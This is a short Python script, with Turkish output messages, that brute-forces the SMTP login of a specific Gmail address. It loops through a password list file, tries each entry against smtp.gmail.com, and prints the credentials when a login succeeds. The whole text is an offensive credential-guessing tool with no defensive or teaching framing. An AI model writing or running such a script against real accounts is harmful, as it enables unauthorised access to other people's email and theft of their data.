import sys, smtplib, socket

IP = "smtp.gmail.com"
USER = "hatadeposu@gmail.com"

attackNumber = 1
with open('passwordlist.txt') as f:
    for PASSWORD in f:
         try:
               print("-" * 12)
               print("Kullanıcı Adı:", USER, "Şifre:", PASSWORD)
               smtp = smtplib.SMTP(IP)
               smtp.login(USER, PASSWORD)
               print("\t\nGiriş Başarılı:", USER, PASSWORD)
               smtp.quit()
               sys.exit(2)
         except(socket.gaierror, socket.error, socket.herror,
         smtplib.SMTPException) as msg:
               print("Hata:", msg)
